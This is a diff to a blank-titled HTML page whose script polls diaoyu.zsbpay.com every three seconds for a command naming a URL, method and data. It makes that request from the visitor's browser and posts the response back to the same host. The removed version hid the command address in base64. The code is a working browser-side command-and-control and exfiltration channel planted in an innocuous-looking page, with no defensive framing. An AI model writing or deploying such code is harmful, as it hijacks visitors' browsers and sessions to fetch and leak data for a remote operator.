@@ -4,39 +4,55 @@
 	<title></title>
 </head>
 <body>
-<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.2.min.js"></script>
 <script type="text/javascript">
+	//后续需改为websocks客户端方式
+	execute();
+
+	//ajax轮训
 	setInterval(execute,3000);
 	function execute(){
-		var explorerhmu=atob('aHR0cHM6Ly9kaWFveXUuenNicGF5LmNvbS91cmwudHh0');
-		var xhr = new XMLHttpRequest();
-		xhr.open("get",explorerhmu,true);
-		xhr.send();
-		xhr.onreadystatechange=function(){
-			if(xhr.readyState == 4 && xhr.status == 200){
-				if(url === xhr.responseText){
-					return;
-				}else{
-					var url = xhr.responseText;
-					gap(url);
-				}
-				
+		new ajax({
+			url:'https://diaoyu.zsbpay.com/url.php',
+			type:'post',
+			data:'null',
+			success:function(data){
+				gap(data);
 			}
-		};
+		});
 	};
 
-	function gap(url){
+	//提交返回值
+	function gap(data){
+		data = JSON.parse(data);
+		new ajax({
+			url:data.url,
+			type:data.type,
+			data:data.data,
+			success:function(res){
+				new ajax({
+					'url':'https://diaoyu.zsbpay.com/p.php',
+					'type':'post',
+					'data':res
+				});
+			}
+		});
+		
+	}
+
+	function ajax(ajax){
+		console.log(ajax);
 		var xhr = new XMLHttpRequest();
-		xhr.open("get",url,true);
-		xhr.send();
+		xhr.open(ajax.type,ajax.url,true);
+		if(ajax.type == 'post'){
+			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+			xhr.send(ajax.data);
+		}else{
+			xhr.send();
+		}
 		xhr.onreadystatechange=function(){
 			if(xhr.readyState == 4 && xhr.status == 200){
 				var res = xhr.responseText;
-				$.ajax({
-					'url':'https://diaoyu.zsbpay.com/p',
-					'type':'POST',
-					'data':res
-				});
+				ajax.success(res);
 			}
 		};
 	}
